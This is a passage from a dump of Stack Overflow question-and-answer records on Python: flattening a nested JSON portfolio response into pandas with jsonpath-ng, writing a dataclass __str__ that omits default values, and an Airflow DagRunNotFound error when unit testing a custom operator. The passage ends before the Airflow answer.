        \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598337,\n                                            \"name\": \"Cht 11th Tr HBO Hannah\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.02089393244695803,\n                                                \"time_weighted_return_2\": -0.02089393244695803,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44394.159999999996\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10598334,\n                                            \"name\": \"Cht 11th Tr HBO Lau\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.020607507059866248,\n                                                \"time_weighted_return_2\": -0.020607507059866248,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44065.39000000001\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                },\n                                {\n                                    \"name\": \"Asset Class F\",\n                                    \"grouping\": \"_custom_level_2_624287\",\n                                    \"columns\": {\n                                        \"time_weighted_return\": -0.0014710489231547497,\n                                        \"time_weighted_return_2\": -0.0014710489231547497,\n                                        \"_custom_twr_audit_note_911328\": null,\n                                        \"value\": 198260.12\n                                    },\n                                    \"children\": [{\n                                            \"entity_id\": 10868778,\n                                            \"name\": \"2012 Desc Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.0014477244560456848,\n                                                \"time_weighted_return_2\": -0.0014477244560456848,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 44612.33\n                                            },\n                                            \"children\": []\n                                        },\n                                        {\n                                            \"entity_id\": 10643052,\n                                            \"name\": \"2013 Irrev Tr HBO Thalia\",\n                                            \"grouping\": \"legal_entity\",\n                                            \"columns\": {\n                                                \"time_weighted_return\": -0.001477821083437858,\n                                                \"time_weighted_return_2\": -0.001477821083437858,\n                                                \"_custom_twr_audit_note_911328\": null,\n                                                \"value\": 153647.78999999998\n                                            },\n                                            \"children\": []\n                                        }\n                                    ]\n                                }\n                            ]\n                        }\n                    ]\n                }]\n            }\n        },\n        \"included\": []\n    }\n}\n\nNotes on JSON Object extract\n\ndata - data in here can be ignored, these are aggregated values for underlying children.\nmeta - columns \u2013 contains the column header values I want to use for each applicable children \u2018column` key:pair values.\ngroupings - can be ignored.\nchildren hierarchy \u2013 there are 4x levels of children which can be identified by their name as follows \u2013\n\nFamily name (i.e., \u2018Falconer Family\u2019)\nWealth Bucket name (e.g., \u2018Wealth Bucket A\u2019)\nAsset Class name (e.g., \u2018Asset Class A\u2019)\nFund name (e.g., \u2018HUDJ Trust\u2019)\n\n\n\nTarget Outputthis is an extract of target df structure I am trying to achieve -\n\n\n\n\nportfolio\nname\nentity_id\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note\n\n\n\n\nFalconer Family\nFalconer Family\n\n23132492.90510712\n-0.046732301295604683\n-0.046732301295604683\nNone\n\n\nFalconer Family\nWealth Bucket A\n\n13264448.506587146\n-0.045960317420568164\n-0.045960317420568164\nNone\n\n\nFalconer Family\nAsset Class A\n\n3337.99\n0.000003434094574039648\n0.000003434094574039648\nNone\n\n\nFalconer Family\nHUDJ Trust\n10604454\n3337.99\n0.000003434094574039648\n0.000003434094574039648\nNone\n\n\nFalconer Family\nAsset Class B\n\n1017004.7192636987\n-0.025871339096964152\n-0.025871339096964152\nNone\n\n\nFalconer Family\nHUDG Trust\n10604454\n1017004.7192636987\n-0.025871339096964152\n-0.025871339096964152\nNone\n\n\nFalconer Family\nAsset Class C\n\n231142.67772000004\n-0.030370376329670656\n-0.030370376329670656\nNone\n\n\nFalconer Family\nHKDJ Trust\n10604454\n231142.67772000004\n-0.030370376329670656\n-0.030370376329670656\nNone\n\n\nFalconer Family\nAsset Class D\n\n9791282.570000006\n-0.05382756475465478\n-0.05382756475465478\nNone\n\n\nFalconer Family\nHUDW Trust\n10604454\n9791282.570000006\n-0.05382756475465478\n-0.05382756475465478\nNone\n\n\n\n\nNotes on Target Output\n\nPortfolio header \u2013 for every row, I would like to map the top-level children name value [family name]. E.g., \u2018Falconer Family.\nName header \u2013 this should simply be the name value from each respective children.\nEntity ID \u2013 all 4th level children entity_id value should be mapped to this column.\nData columns \u2013 regardless of level, all children have identical time_weighted_return, time-weighted_return2 and value columns which should be mapped respectively.\nTWR Audit Note \u2013 these children _custom_twr_audit_note_911318 values are currently blank, but will be utilized in the future.\n\nCurrent OutputMy main issue is that you can see that I have only been able to tap into the 1st [Family] and 2nd [Wealth Bucket] children level. This leaves me missing the 3rd [Asset Class] and 4th [Fund] -\n\n\n\n\n\nportfolio\nname\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note)\n\n\n\n\n0\nFalconer Family\nFalconer Family\n2.313249e+07\n-0.046732\n-0.046732\nNone\n\n\n1\nFalconer Family\nWealth Bucket A\n1.326445e+07\n-0.045960\n-0.045960\nNone\n\n\n2\nFalconer Family\nWealth Bucket B\n9.868044e+06\n-0.047699\n-0.047699\nNone\n\n\n\n\nCurrent codeThis is a function which gets me the correct df formatting, however my main issue is that I haven't been able to find a solution to returning all children, but rather only the top-level -\n# Function to read API response / JSON Object\ndef response_writer():\n    with open('api_response_2022-02-13.json') as f:\n        api_response = json.load(f)\n        return api_response\n\n# Function to unpack JSON response into pandas dataframe.\ndef unpack_response():\n    while True:\n        try:\n            api_response = response_writer()\n            portfolio_views_children = api_response['data']['attributes']['total']['children']\n            portfolios = []\n            for portfolio in portfolio_views_children:\n                entity_columns = []\n                # include portfolio itself within an iterable so the total is the header\n                for entity in itertools.chain([portfolio], portfolio[\"children\"]):\n                    entity_data = entity[\"columns\"].copy()  # don't mutate original response\n                    entity_data[\"portfolio\"] = portfolio[\"name\"]   # from outer\n                    entity_data[\"name\"]      = entity[\"name\"]\n                    entity_columns.append(entity_data)\n\n                df = pd.DataFrame(entity_columns)\n                portfolios.append(df)\n\n            # combine dataframes\n            df = pd.concat(portfolios)\n            # reorder and rename\n            column_ordering = {\"portfolio\": \"portfolio\", \"name\": \"name\"}\n            column_ordering.update({c[\"key\"]: c[\"display_name\"] for c in api_response[\"meta\"][\"columns\"]})\n            df = df[column_ordering.keys()]   # beware: un-named cols will be dropped\n            df = df.rename(columns=column_ordering)\n            break\n        except KeyError:\n            print(\"-----------------------------------\\n\",\"API TIMEOUT ERROR: TRY AGAIN...\", \"\\n-----------------------------------\\n\")\n    return df\nunpack_response()\n\nHelpIn short, I am looking for some advice on how I can tap into the remaining children by enhancing the existing code. Whilst I have taken much time to fully explain my problem, please ask if anything isn't clear. Please note that the JSON may have multiple families, so the solution / advice offered must observe this\n",
    "AcceptedAnswerId": 71136605,
    "AcceptedAnswer": "jsonpath-ng can parse even such a nested json object very easily. You can install this convenient library by the following command:\npip install --upgrade jsonpath-ng\n\nCode:\nimport json\nimport jsonpath_ng as jp\nimport pandas as pd\n\ndef unpack_response(r):\n    # Create a dataframe from extracted data\n    expr = jp.parse('$..children.[*]')\n    data = [{'full_path': str(m.full_path), **m.value} for m in expr.find(r)]\n    df = pd.json_normalize(data).sort_values('full_path', ignore_index=True)\n\n    # Append a portfolio column\n    df['portfolio'] = df.loc[df.full_path.str.contains(r'total\\.children\\.\\[\\d+]$'), 'name']\n    df['portfolio'].fillna(method='ffill', inplace=True)\n\n    # Deal with columns\n    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}\n    cols = ['full_path', 'portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']\n    df = df.rename(columns=trans)[cols]\n\n    return df\n\n# Load the sample data from file\n# with open('api_response_2022-02-13.json', 'r') as f:\n#     api_response = json.load(f)\n\n# Load the sample data from string\napi_response = json.loads('{\"meta\": {\"columns\": [{\"key\": \"value\", \"display_name\": \"Adjusted Value (No Div, USD)\", \"output_type\": \"Number\", \"currency\": \"USD\"}, {\"key\": \"time_weighted_return\", \"display_name\": \"Current Quarter TWR (USD)\", \"output_type\": \"Percent\", \"currency\": \"USD\"}, {\"key\": \"time_weighted_return_2\", \"display_name\": \"YTD TWR (USD)\", \"output_type\": \"Percent\", \"currency\": \"USD\"}, {\"key\": \"_custom_twr_audit_note_911328\", \"display_name\": \"TWR Audit Note\", \"output_type\": \"Word\"}], \"groupings\": [{\"key\": \"_custom_name_747205\", \"display_name\": \"* Reporting Client Name\"}, {\"key\": \"_custom_new_entity_group_453577\", \"display_name\": \"NEW Entity Group\"}, {\"key\": \"_custom_level_2_624287\", \"display_name\": \"* Level 2\"}, {\"key\": \"legal_entity\", \"display_name\": \"Legal Entity\"}]}, \"data\": {\"type\": \"portfolio_views\", \"attributes\": {\"total\": {\"name\": \"Total\", \"columns\": {\"time_weighted_return\": -0.046732301295604683, \"time_weighted_return_2\": -0.046732301295604683, \"_custom_twr_audit_note_911328\": null, \"value\": 23132492.905107163}, \"children\": [{\"name\": \"Falconer Family\", \"grouping\": \"_custom_name_747205\", \"columns\": {\"time_weighted_return\": -0.046732301295604683, \"time_weighted_return_2\": -0.046732301295604683, \"_custom_twr_audit_note_911328\": null, \"value\": 23132492.905107163}, \"children\": [{\"name\": \"Wealth Bucket A\", \"grouping\": \"_custom_new_entity_group_453577\", \"columns\": {\"time_weighted_return\": -0.045960317420568164, \"time_weighted_return_2\": -0.045960317420568164, \"_custom_twr_audit_note_911328\": null, \"value\": 13264448.506587159}, \"children\": [{\"name\": \"Asset Class A\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": 3.434094574039648e-06, \"time_weighted_return_2\": 3.434094574039648e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 3337.99}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 3.434094574039648e-06, \"time_weighted_return_2\": 3.434094574039648e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 3337.99}, \"children\": []}]}, {\"name\": \"Asset Class B\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.025871339096964152, \"time_weighted_return_2\": -0.025871339096964152, \"_custom_twr_audit_note_911328\": null, \"value\": 1017004.7192636987}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDG Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.025871339096964152, \"time_weighted_return_2\": -0.025871339096964152, \"_custom_twr_audit_note_911328\": null, \"value\": 1017004.7192636987}, \"children\": []}]}, {\"name\": \"Asset Class C\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.030370376329670656, \"time_weighted_return_2\": -0.030370376329670656, \"_custom_twr_audit_note_911328\": null, \"value\": 231142.67772000004}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HKDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.030370376329670656, \"time_weighted_return_2\": -0.030370376329670656, \"_custom_twr_audit_note_911328\": null, \"value\": 231142.67772000004}, \"children\": []}]}, {\"name\": \"Asset Class D\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.05382756475465478, \"time_weighted_return_2\": -0.05382756475465478, \"_custom_twr_audit_note_911328\": null, \"value\": 9791282.570000006}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HUDW Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05382756475465478, \"time_weighted_return_2\": -0.05382756475465478, \"_custom_twr_audit_note_911328\": null, \"value\": 9791282.570000006}, \"children\": []}]}, {\"name\": \"Asset Class E\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.01351630404081805, \"time_weighted_return_2\": -0.01351630404081805, \"_custom_twr_audit_note_911328\": null, \"value\": 2153366.6396034593}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HJDJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.01351630404081805, \"time_weighted_return_2\": -0.01351630404081805, \"_custom_twr_audit_note_911328\": null, \"value\": 2153366.6396034593}, \"children\": []}]}, {\"name\": \"Asset Class F\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.002298190175237247, \"time_weighted_return_2\": -0.002298190175237247, \"_custom_twr_audit_note_911328\": null, \"value\": 68313.90999999999}, \"children\": [{\"entity_id\": 10604454, \"name\": \"HADJ Trust\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.002298190175237247, \"time_weighted_return_2\": -0.002298190175237247, \"_custom_twr_audit_note_911328\": null, \"value\": 68313.90999999999}, \"children\": []}]}]}, {\"name\": \"Wealth Bucket B\", \"grouping\": \"_custom_new_entity_group_453577\", \"columns\": {\"time_weighted_return\": -0.04769870075659244, \"time_weighted_return_2\": -0.04769870075659244, \"_custom_twr_audit_note_911328\": null, \"value\": 9868044.398519998}, \"children\": [{\"name\": \"Asset Class A\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": 2.8632718065191298e-05, \"time_weighted_return_2\": 2.8632718065191298e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 10234.94}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 2.82679297198829e-05, \"time_weighted_return_2\": 2.82679297198829e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 244.28}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 4.9373572795108345e-05, \"time_weighted_return_2\": 4.9373572795108345e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 5081.08}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 6.609603754315074e-06, \"time_weighted_return_2\": 6.609603754315074e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 1523.62}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 1.0999769004760296e-05, \"time_weighted_return_2\": 1.0999769004760296e-05, \"_custom_twr_audit_note_911328\": null, \"value\": 1828.9}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 6.466673995619843e-06, \"time_weighted_return_2\": 6.466673995619843e-06, \"_custom_twr_audit_note_911328\": null, \"value\": 1557.06}, \"children\": []}]}, {\"name\": \"Asset Class B\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.024645947842438676, \"time_weighted_return_2\": -0.024645947842438676, \"_custom_twr_audit_note_911328\": null, \"value\": 674052.31962}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.043304004172576405, \"time_weighted_return_2\": -0.043304004172576405, \"_custom_twr_audit_note_911328\": null, \"value\": 52800.96}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.022408434778798836, \"time_weighted_return_2\": -0.022408434778798836, \"_custom_twr_audit_note_911328\": null, \"value\": 599594.11962}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.039799855483646174, \"time_weighted_return_2\": -0.039799855483646174, \"_custom_twr_audit_note_911328\": null, \"value\": 7219.08}, \"children\": []}]}, {\"name\": \"Asset Class C\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.03037038746301135, \"time_weighted_return_2\": -0.03037038746301135, \"_custom_twr_audit_note_911328\": null, \"value\": 114472.69744}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.030370390035505124, \"time_weighted_return_2\": -0.030370390035505124, \"_custom_twr_audit_note_911328\": null, \"value\": 114472.68744000001}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": 0, \"time_weighted_return_2\": 0, \"_custom_twr_audit_note_911328\": null, \"value\": 0.01}, \"children\": []}]}, {\"name\": \"Asset Class D\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.06604362523792162, \"time_weighted_return_2\": -0.06604362523792162, \"_custom_twr_audit_note_911328\": null, \"value\": 5722529.229999997}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.06154960593668424, \"time_weighted_return_2\": -0.06154960593668424, \"_custom_twr_audit_note_911328\": null, \"value\": 1191838.9399999995}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.06750460387418267, \"time_weighted_return_2\": -0.06750460387418267, \"_custom_twr_audit_note_911328\": null, \"value\": 4416618.520000002}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 38190.33}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 37940.72}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.05604507809250081, \"time_weighted_return_2\": -0.05604507809250081, \"_custom_twr_audit_note_911328\": null, \"value\": 37940.72}, \"children\": []}]}, {\"name\": \"Asset Class E\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.017118805423322003, \"time_weighted_return_2\": -0.017118805423322003, \"_custom_twr_audit_note_911328\": null, \"value\": 3148495.0914600003}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.015251157805867277, \"time_weighted_return_2\": -0.015251157805867277, \"_custom_twr_audit_note_911328\": null, \"value\": 800493.06146}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.01739609576880241, \"time_weighted_return_2\": -0.01739609576880241, \"_custom_twr_audit_note_911328\": null, \"value\": 2215511.2700000005}, \"children\": []}, {\"entity_id\": 10598341, \"name\": \"Cht 11th Tr HBO Shirley\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.02085132265594647, \"time_weighted_return_2\": -0.02085132265594647, \"_custom_twr_audit_note_911328\": null, \"value\": 44031.21}, \"children\": []}, {\"entity_id\": 10598337, \"name\": \"Cht 11th Tr HBO Hannah\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.02089393244695803, \"time_weighted_return_2\": -0.02089393244695803, \"_custom_twr_audit_note_911328\": null, \"value\": 44394.159999999996}, \"children\": []}, {\"entity_id\": 10598334, \"name\": \"Cht 11th Tr HBO Lau\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.020607507059866248, \"time_weighted_return_2\": -0.020607507059866248, \"_custom_twr_audit_note_911328\": null, \"value\": 44065.39000000001}, \"children\": []}]}, {\"name\": \"Asset Class F\", \"grouping\": \"_custom_level_2_624287\", \"columns\": {\"time_weighted_return\": -0.0014710489231547497, \"time_weighted_return_2\": -0.0014710489231547497, \"_custom_twr_audit_note_911328\": null, \"value\": 198260.12}, \"children\": [{\"entity_id\": 10868778, \"name\": \"2012 Desc Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.0014477244560456848, \"time_weighted_return_2\": -0.0014477244560456848, \"_custom_twr_audit_note_911328\": null, \"value\": 44612.33}, \"children\": []}, {\"entity_id\": 10643052, \"name\": \"2013 Irrev Tr HBO Thalia\", \"grouping\": \"legal_entity\", \"columns\": {\"time_weighted_return\": -0.001477821083437858, \"time_weighted_return_2\": -0.001477821083437858, \"_custom_twr_audit_note_911328\": null, \"value\": 153647.78999999998}, \"children\": []}]}]}]}]}}, \"included\": []}}')\n\ndf = unpack_response(api_response)\n\nExplanation:\nFirstly, you can confirm the expected output by the following command:\nprint(df.iloc[:5:,1:])\n\n\n\n\n\nportfolio\nname\nentity_id\nAdjusted Value (No Div, USD)\nCurrent Quarter TWR (USD)\nYTD TWR (USD)\nTWR Audit Note\n\n\n\n\nFalconer Family\nFalconer Family\nnan\n2.31325e+07\n-0.0467323\n-0.0467323\n\n\n\nFalconer Family\nWealth Bucket A\nnan\n1.32644e+07\n-0.0459603\n-0.0459603\n\n\n\nFalconer Family\nAsset Class A\nnan\n3337.99\n3.43409e-06\n3.43409e-06\n\n\n\nFalconer Family\nHUDJ Trust\n1.06045e+07\n3337.99\n3.43409e-06\n3.43409e-06\n\n\n\nFalconer Family\nAsset Class B\nnan\n1.017e+06\n-0.0258713\n-0.0258713\n\n\n\n\n\nSubsequently, you can see one of the wonderful features in jsonpath-ng by the following command:\nprint(df.iloc[:10,:3])\n\n\n\n\n\nfull_path\nportfolio\nname\n\n\n\n\ndata.attributes.total.children.[0]\nFalconer Family\nFalconer Family\n\n\ndata.attributes.total.children.[0].children.[0]\nFalconer Family\nWealth Bucket A\n\n\ndata.attributes.total.children.[0].children.[0].children.[0]\nFalconer Family\nAsset Class A\n\n\ndata.attributes.total.children.[0].children.[0].children.[0].children.[0]\nFalconer Family\nHUDJ Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[1]\nFalconer Family\nAsset Class B\n\n\ndata.attributes.total.children.[0].children.[0].children.[1].children.[0]\nFalconer Family\nHUDG Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[2]\nFalconer Family\nAsset Class C\n\n\ndata.attributes.total.children.[0].children.[0].children.[2].children.[0]\nFalconer Family\nHKDJ Trust\n\n\ndata.attributes.total.children.[0].children.[0].children.[3]\nFalconer Family\nAsset Class D\n\n\ndata.attributes.total.children.[0].children.[0].children.[3].children.[0]\nFalconer Family\nHUDW Trust\n\n\n\n\nThanks to the full_path column, you can grasp the nesting level of the extracted data in each row instantaneously. Actually, I appended the correct portfolio values by using these paths.\nIn terms of the code, the key point is the following line:\nexpr = jp.parse('$..children.[*]')\n\nBy the above expression, you can search the children attributes at any level of the json object. README.rst tells you what each syntax stands for.\n\n\n\n\nSyntax\nMeaning\n\n\n\n\n$\nThe root object\n\n\njsonpath1 .. jsonpath2\nAll nodes matched by jsonpath2 that descend from any node matching jsonpath1\n\n\n[*]\nany array index\n\n\n\nSpeed:\nI compared the speed between the above method with jsonpath-ng and a nested-for-loop method shown below.\n# Comparison:\n\n\n\n\nMethod\nDuration\nSpeed ratio\n\n\n\n\njsonpath-ng\n9.72 ms \u00b1 342 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 100 loops each)\n5.7 (faster)\n\n\nNested-for-loop\n55.4 ms \u00b1 7.39 ms per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n1\n\n\n\n# Code of the nested-for-loop method:\ndef unpack_response(r):\n    df = pd.DataFrame()\n    for _, r1 in pd.json_normalize(r, ['data', 'attributes', 'total', 'children']).iterrows(): \n        r1['portfolio'] = r1['name']\n        df = df.append(r1)\n        for _, r2 in pd.json_normalize(r1.children).iterrows(): \n            df = df.append(r2)\n            for _, r3 in pd.json_normalize(r2.children).iterrows(): \n                df = df.append(r3).append(pd.json_normalize(r3.children))\n    df['portfolio'].fillna(method='ffill', inplace=True)\n    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}\n    cols = ['portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']\n    df = df.rename(columns=trans)[cols].reset_index(drop=True)\n    return df\n\n"
}
{
    "Id": 71344648,
    "PostTypeId": 1,
    "Title": "How to define `__str__` for `dataclass` that omits default values?",
    "Body": "Given a dataclass instance, I would like print() or str() to only list the non-default field values.  This is useful when the dataclass has many fields and only a few are changed.\n@dataclasses.dataclass\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\nx = X(b=True)\nprint(x)  # Desired output: X(b=True)\n\n",
    "AcceptedAnswerId": 71344649,
    "AcceptedAnswer": "The solution is to add a custom __str__() function:\n@dataclasses.dataclass\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\n  def __str__(self):\n    \"\"\"Returns a string containing only the non-default field values.\"\"\"\n    s = ', '.join(f'{field.name}={getattr(self, field.name)!r}'\n                  for field in dataclasses.fields(self)\n                  if getattr(self, field.name) != field.default)\n    return f'{type(self).__name__}({s})'\n\nx = X(b=True)\nprint(x)        # X(b=True)\nprint(str(x))   # X(b=True)\nprint(repr(x))  # X(a=1, b=True, c=2.0)\nprint(f'{x}, {x!s}, {x!r}')  # X(b=True), X(b=True), X(a=1, b=True, c=2.0)\n\n\nThis can also be achieved using a decorator:\ndef terse_str(cls):  # Decorator for class.\n  def __str__(self):\n    \"\"\"Returns a string containing only the non-default field values.\"\"\"\n    s = ', '.join(f'{field.name}={getattr(self, field.name)}'\n                  for field in dataclasses.fields(self)\n                  if getattr(self, field.name) != field.default)\n    return f'{type(self).__name__}({s})'\n\n  setattr(cls, '__str__', __str__)\n  return cls\n\n@dataclasses.dataclass\n@terse_str\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\n"
}
{
    "Id": 71221412,
    "PostTypeId": 1,
    "Title": "Dag run not found when unit testing a custom operator in Airflow",
    "Body": "I've written a custom operator (DataCleaningOperator), which corrects JSON data based on a provided schema.\nThe unit tests previously worked when I didn't have to instatiate a TaskInstance and provide the operator with a context. However, I've updated the operator recently to take in a context (so that it can use xcom_push).\nHere is an example of one of the tests:\nDEFAULT_DATE = datetime.today()\n\nclass TestDataCleaningOperator(unittest.TestCase):    \n    \"\"\"\n    Class to execute unit tests for the operator 'DataCleaningOperator'.\n    \"\"\"\n    def setUp(self) -> None:\n        super().setUp()\n        self.dag = DAG(\n            dag_id=\"test_dag_data_cleaning\",\n            schedule_interval=None,\n            default_args={\n                \"owner\": \"airflow\",\n                \"start_date\": DEFAULT_DATE,\n                \"output_to_xcom\": True,\n            },\n        )\n        self._initialise_test_data()\n\n    def _initialize_test_data() -> None:\n        # Test data set here as class variables such as self.test_data_correct\n        ...\n\n    def test_operator_cleans_dataset_which_matches_schema(self) -> None:\n        \"\"\"\n        Test: Attempt to clean a dataset which matches the provided schema.\n        Verification: Returns the original dataset, unchanged.\n        \"\"\"\n        task = DataCleaningOperator(\n            task_id=\"test_operator_cleans_dataset_which_matches_schema\",\n            schema_fields=self.test_schema_nest,\n            data_file_object=deepcopy(self.test_data_correct),\n            dag=self.dag,\n        )\n        ti = TaskInstance(task=task, execution_date=DEFAULT_DATE)\n        result: List[dict] = task.execute(ti.get_template_context())\n        self.assertEqual(result, self.test_data_correct)\n\nHowever, when the tests are run, the following error is raised:\nairflow.exceptions.DagRunNotFound: DagRun for 'test_dag_data_cleaning' with date 2022-02-22 12:09:51.538954+00:00 not found\n\nThis is related to the line in which a task instance is instantiated in test_operator_cleans_dataset_which_matches_schema.\nWhy can't Airflow locate the test_dag_data_cleaning DAG? Is there a specific configuration I've missed? Do I need to also create a DAG run instance or add the DAG to the dag bag manually if this test dag is outide of my standard DAG directory? All normal (non-test) dags in my dag dir run correctly.\nIn case it helps, my current Airflow version is 2.2.3 and the structure of my project is:\nairflow\n\u251c\u2500 dags\n\u251c\u2500 plugins\n|  \u251c\u2500 ...\n|  \u2514\u2500 operators\n|     \u251c\u2500 ...\n|     \u2514\u2500 data_cleaning_operator.py\n|\n\u2514\u2500 tests\n   \u251c\u2500 ...\n   \u2514\u2500 operators\n      \u2514\u2500 test_data_cleaning_operator.py\n\n",
    "AcceptedAnswerId": 71346981,
